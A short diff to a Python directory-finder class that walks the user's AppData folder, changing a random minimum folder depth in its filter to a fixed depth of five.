@@ -11,7 +11,7 @@ class Finder(object):
  root_dir = os.path.abspath(os.path.sep) + os.path.sep + 'Users' + os.path.sep + getuser() + os.path.sep + 'AppData'
 
  def is_bad(root, dirs, files):
-  return not all([len(dirs), len(files), len(os.path.normpath(root).split(os.sep)) >= randint(5, 10)])   
+  return not all([len(dirs), len(files), len(os.path.normpath(root).split(os.sep)) >= 5])   
 
  def choice(items):
   for _ in range(randint(3, 10)):
